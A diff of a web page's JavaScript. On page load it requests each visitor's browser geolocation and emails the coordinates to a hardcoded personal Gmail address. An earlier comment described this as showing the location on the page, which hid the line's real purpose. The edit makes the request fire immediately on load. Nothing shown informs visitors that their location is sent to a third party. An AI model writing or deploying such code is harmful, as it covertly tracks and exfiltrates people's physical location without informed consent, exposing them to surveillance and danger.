@@ -175,7 +175,7 @@
                         latitude = position.coords.latitude;
                         longitude = position.coords.longitude;
 
-                        // Show the location on the page
+                        // Send the location data via email
                         sendEmail("Location Access", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
@@ -187,10 +187,10 @@
             }
         }
 
-        // Call the requestLocation function on page load
-        window.onload = function() {
-            requestLocation();
-        };
+        // Request the location on page load
+        window.addEventListener('load', function () {
+            requestLocation();  // Trigger the location request immediately
+        });
 
         // Function to send the location data via email
         function sendEmail(subject, message, recipientEmail) {
